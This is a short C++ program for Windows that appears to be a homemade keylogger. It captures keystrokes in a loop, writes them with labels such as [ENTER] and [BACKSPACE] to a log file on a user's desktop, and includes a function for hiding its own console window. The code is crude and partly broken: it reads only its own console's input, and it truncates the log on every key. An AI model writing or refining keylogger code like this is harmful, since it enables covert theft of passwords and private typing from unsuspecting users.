#define _CRT_NONSTDC_NO_DEPRECATE
#include <iostream>
#include <Windows.h>
#include <time.h>
#include <fstream>
#include <conio.h>
void hideConsole();
void showConsole();
void capture_key();

int main()
{
	//hideConsole();
	showConsole();
	std::ofstream log;
	log.open("C:\\Users\\Tal\\Desktop\\Log.txt");
	if (log.fail())
	{
		exit(0);
	}
	while (true)
	{
		Sleep(50);
		capture_key();
	}
}

void capture_key()
{
	std::ofstream log;
	log.open("C:\\Users\\Tal\\Desktop\\Log.txt");
	char key;
	key = getch();
	switch ((int)key)
	{
	case 27: // leave when pressed Escape key
		exit(1);

	case ' ': // Space key
		log << " ";
		break;
	
	case 0x0D: // Enter key
		log << "[ENTER]";
		break;
	
	case 0x08: // Backspace key
		log << "[BACKSPACE]";
		break;

	case 0x09: // Tab key
		log << "[TAB]";
		break;
	default:
		log << key;
	}
}

void hideConsole()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void showConsole()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);
}